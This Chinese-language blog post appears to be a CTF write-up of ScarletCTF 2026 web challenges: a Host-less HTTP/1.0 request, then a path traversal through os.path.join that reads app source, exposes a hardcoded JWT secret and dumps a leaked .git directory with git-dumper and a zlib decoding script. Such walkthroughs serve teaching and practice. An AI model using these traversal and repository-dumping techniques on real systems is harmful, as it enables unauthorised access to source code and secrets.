<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>scarletctf2026复现 | ivory's blog</title><meta name="author" content="ivory"><meta name="copyright" content="ivory"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Web语言不通真的是硬伤 CommentaryDescriptionYou’re currently speaking to my favorite host right now (ctf.rusec.club), but who’s to say you even had to speak with one? Sometimes, the treasure to be found is just">
<meta property="og:type" content="article">
<meta property="og:title" content="scarletctf2026复现">
<meta property="og:url" content="http://ireel.github.io/2026/01/23/scarlet-ctf2026/index.html">
<meta property="og:site_name" content="ivory&#39;s blog">
<meta property="og:description" content="Web语言不通真的是硬伤 CommentaryDescriptionYou’re currently speaking to my favorite host right now (ctf.rusec.club), but who’s to say you even had to speak with one? Sometimes, the treasure to be found is just">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://ireel.github.io/img/logo/scarlet.png">
<meta property="article:published_time" content="2026-01-23T05:46:55.000Z">
<meta property="article:modified_time" content="2026-01-23T07:25:54.805Z">
<meta property="article:author" content="ivory">
<meta property="article:tag" content="write_up">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://ireel.github.io/img/logo/scarlet.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "scarletctf2026复现",
  "url": "http://ireel.github.io/2026/01/23/scarlet-ctf2026/",
  "image": "http://ireel.github.io/img/logo/scarlet.png",
  "datePublished": "2026-01-23T05:46:55.000Z",
  "dateModified": "2026-01-23T07:25:54.805Z",
  "author": [
    {
      "@type": "Person",
      "name": "ivory",
      "url": "http://ireel.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://ireel.github.io/2026/01/23/scarlet-ctf2026/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'scarletctf2026复现',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/custom.css"><script src="/js/custom.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/Commedia/videoframe_68476.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/logo/scarlet.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ivory's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">scarletctf2026复现</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">scarletctf2026复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-23T05:46:55.000Z" title="发表于 2026-01-23 13:46:55">2026-01-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-23T07:25:54.805Z" title="更新于 2026-01-23 15:25:54">2026-01-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>语言不通真的是硬伤</p>
<h3 id="Commentary"><a href="#Commentary" class="headerlink" title="Commentary"></a>Commentary</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>You’re currently speaking to my favorite <strong>host</strong> right now (ctf.rusec.club), but who’s to say you even had to speak with one?</p>
<p>Sometimes, the treasure to be found is just bloat that people forgot to remove.</p>
<h4 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h4><p>这里的不和host对话直接就是请求报文中不使用HOST的意思</p>
<p>当时没看懂什么意思</p>
<p>其中<code>HTTP/1.1</code>协议规定必须携带host请求头</p>
<p>所以我们只能使用<code>HTTP/1.0</code>协议</p>
<p>可以使用命令行发送</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span> | nc ctf.rusec.club 80</span><br></pre></td></tr></table></figure>

<p>也可以使用python脚本发送和接收</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">target_host = <span class="string">&quot;ctf.rusec.club&quot;</span></span><br><span class="line">target_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">client.connect((target_host, target_port))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">client.send(payload)</span><br><span class="line"></span><br><span class="line">response = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    chunk = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    response += chunk</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.24.0 (Ubuntu)</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 14 Jan 2026 10:28:00 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>691</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Fri, 02 Jan 2026 01:15:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;69571c3c-2b3&quot;</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-tag">html</span> &#123; <span class="attribute">color-scheme</span>: light dark; &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-tag">body</span> &#123; <span class="attribute">width</span>: <span class="number">35em</span>; <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="attribute">font-family</span>: Tahoma, Verdana, Arial, sans-serif; &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to nginx!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>If you see this page, the nginx web server is successfully installed and</span></span><br><span class="line"><span class="language-xml">working. Further configuration is required.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>For online documentation and support please refer to</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.org/&quot;</span>&gt;</span>nginx.org<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">Commercial support is available at</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://nginx.com/&quot;</span>&gt;</span>nginx.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- you found me :3 --!&gt;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">&lt;!-- RUSEC&#123;truly_the_hardest_ctf_challenge&#125; --!&gt;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml"></span></span></span><br><span class="line"><span class="comment"><span class="language-xml">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">&lt;/body&gt;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">&lt;/html&gt;</span></span></span><br></pre></td></tr></table></figure>



<h3 id="SWE-Intern-at-Girly-Pop-Inc"><a href="#SWE-Intern-at-Girly-Pop-Inc" class="headerlink" title="SWE Intern at Girly Pop Inc"></a>SWE Intern at Girly Pop Inc</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><p>Last week we fired an intern at Girlie Pop INC for stealing too much food from the office. It seems they didn’t know much about secure software development either…</p>
<p>The challenge presents a JWT token generation web application at <code>https://girly.ctf.rusec.club</code>.</p>
<h4 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h4><p>一个经典<code>os.path.join()</code>的路径遍历</p>
<p>允许使用<code>../</code>返回上级目录，也允许直接使用根目录开始的绝对路径（会忽视<code>baseurl</code>）</p>
<p>使用<code>../app.py</code>读出源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, send_file</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># commment for testing</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;f0und_my_k3y_1_gu3$$&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/generate&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;iat&#x27;</span>: datetime.datetime.utcnow(),</span><br><span class="line">        <span class="string">&#x27;exp&#x27;</span>: datetime.datetime.utcnow() + datetime.timedelta(minutes=<span class="number">30</span>),</span><br><span class="line">        <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;standard_user&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(payload, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, token=token)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/view&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>():</span><br><span class="line"></span><br><span class="line">    page = request.args.get(<span class="string">&#x27;page&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> page:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Missing &#x27;page&#x27; parameter&quot;</span>, <span class="number">400</span></span><br><span class="line">    base_dir = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">    target_path = os.path.abspath(os.path.join(base_dir, <span class="string">&#x27;static&#x27;</span>, page))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file_path = os.path.join(<span class="string">&#x27;static&#x27;</span>, page)</span><br><span class="line">        <span class="keyword">return</span> send_file(file_path)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found or access denied.&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>可以随便签token但是没有身份认证的内容</p>
<p>注意到<code>about.html</code>页面的信息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">System Information</span><br><span class="line">Current Service Status: OPERATIONAL</span><br><span class="line"></span><br><span class="line">Infrastructure Notes:</span><br><span class="line">Running on Python <span class="number">3.9</span> (Flask Framework)</span><br><span class="line">HS256 Token Signing Engine: Active</span><br><span class="line">Internal Storage: Encrypted</span><br><span class="line">Deployment: Automated via Git-Hooks</span><br></pre></td></tr></table></figure>

<p>我们可以知道python版本为3.9</p>
<p>然后有可能使用了git进行版本控制</p>
<p>访问一下发现确实存在git泄露，可以使用这个改一下脚本后拉下来：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WangYihang/GitHacker.git">https://github.com/WangYihang/GitHacker.git</a></p>
<p>但是这个拉下来的objects文件很可能是不全的</p>
<p>使用git-dumper可以获取比较全的objects：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git-dumper https://girly.ctf.rusec.club/view?page=../.git/ result2</span><br></pre></td></tr></table></figure>

<p>githack拉下来的可以正常使用git命令，但是git-dumper却不行了</p>
<p>之后使用这个脚本把所有的objects都解析成明文就可以正常寻找信息了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># === 配置 ===</span></span><br><span class="line">GIT_OBJECTS_DIR = os.path.join(os.getcwd(), <span class="string">&quot;.git&quot;</span>, <span class="string">&quot;objects&quot;</span>)</span><br><span class="line">OUTPUT_DIR = os.path.join(os.getcwd(), <span class="string">&quot;recovered_files&quot;</span>)</span><br><span class="line"><span class="comment"># ============</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(OUTPUT_DIR):</span><br><span class="line">    os.makedirs(OUTPUT_DIR)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Scanning <span class="subst">&#123;GIT_OBJECTS_DIR&#125;</span> for all loose objects...&quot;</span>)</span><br><span class="line"></span><br><span class="line">restored_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历 .git/objects/xx/xxx...</span></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(GIT_OBJECTS_DIR):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="comment"># 跳过 info 和 pack 目录中的非对象文件</span></span><br><span class="line">        <span class="keyword">if</span> file == <span class="string">&quot;packs&quot;</span> <span class="keyword">or</span> file.endswith(<span class="string">&quot;.idx&quot;</span>) <span class="keyword">or</span> file.endswith(<span class="string">&quot;.pack&quot;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        full_path = os.path.join(root, file)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 尝试读取并解压</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(full_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                compressed_data = f.read()</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> compressed_data: <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Zlib 解压</span></span><br><span class="line">                raw_data = zlib.decompress(compressed_data)</span><br><span class="line">            <span class="keyword">except</span> zlib.error:</span><br><span class="line">                <span class="keyword">continue</span> <span class="comment"># 不是 zlib 数据，跳过</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Git 对象格式: type size\0content</span></span><br><span class="line">            null_index = raw_data.find(<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> null_index == -<span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            header = raw_data[:null_index]</span><br><span class="line">            content = raw_data[null_index+<span class="number">1</span>:]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 解析类型</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                obj_type = header.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">0</span>].decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 只保留 blob (文件内容) 并尝试保存为文本</span></span><br><span class="line">            <span class="keyword">if</span> obj_type == <span class="string">&quot;blob&quot;</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># 尝试用 utf-8 解码，如果成功则认为是文本文件</span></span><br><span class="line">                    text_content = content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(text_content) &gt; <span class="number">0</span>:</span><br><span class="line">                        <span class="comment"># 组合 hash 值 (文件夹名 + 文件名)</span></span><br><span class="line">                        obj_hash = os.path.basename(root) + file</span><br><span class="line">                        save_path = os.path.join(OUTPUT_DIR, <span class="string">f&quot;<span class="subst">&#123;obj_hash&#125;</span>_<span class="subst">&#123;obj_type&#125;</span>.txt&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> out:</span><br><span class="line">                            out.write(text_content)</span><br><span class="line">                        </span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[+] Recovered <span class="subst">&#123;obj_type&#125;</span>: <span class="subst">&#123;obj_hash&#125;</span>&quot;</span>)</span><br><span class="line">                        restored_count += <span class="number">1</span></span><br><span class="line">                        </span><br><span class="line">                <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                    <span class="comment"># 如果是二进制文件（图片、编译文件等），跳过</span></span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># 遇到权限或其他IO错误跳过</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[*] Extraction complete. Check the &#x27;<span class="subst">&#123;OUTPUT_DIR&#125;</span>&#x27; folder.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Total text files recovered: <span class="subst">&#123;restored_count&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>最后找到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/.git/objects/<span class="number">61</span>/f9cd8f2e1d3afd8dace27cac0eff1f88e8d463</span><br></pre></td></tr></table></figure>

<p>对应的明文为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUSEC&#123;a1way$_1gnor3_3nv_f1l3s_up47910k390cyhu623&#125;</span><br></pre></td></tr></table></figure>



<p>如果想要手动读取分析的话，一般先读取<code>/.git/HEAD</code>获取当前指向哪个分支：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ref: refs/heads/master</span><br></pre></td></tr></table></figure>

<p>获取最新的<code>commit hash</code>，读取<code>/.git/refs/heads/master</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9e26820af5010a2afa8e4c09023c1ee078e8e8aa</span><br></pre></td></tr></table></figure>

<p>读取对应的objects对象，<code>/.git/objects/9e/26820af5010a2afa8e4c09023c1ee078e8e8aa</code>:</p>
<p>下载后使用这个命令解压：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import zlib,sys; raw=zlib.decompress(sys.stdin.buffer.read()); print(raw.split(b&#x27;\x00&#x27;, 1)[1].decode(errors=&#x27;replace&#x27;))&quot; &lt; 26820af5010a2afa8e4c09023c1ee078e8e8aa</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tree b0e7b939b4a9c8cfda2e3102d301d7530aaa4f0f</span><br><span class="line">parent 7d568bcf0d6139bb8738949561210f592902a4c9</span><br><span class="line">author intern-3 &lt;nobody@nobody.com&gt; 1768141249 +0100</span><br><span class="line">committer intern-3 &lt;nobody@nobody.com&gt; 1768141249 +0100</span><br><span class="line"></span><br><span class="line">removed flag</span><br></pre></td></tr></table></figure>

<p>使用同样的方法查看tree对象：</p>
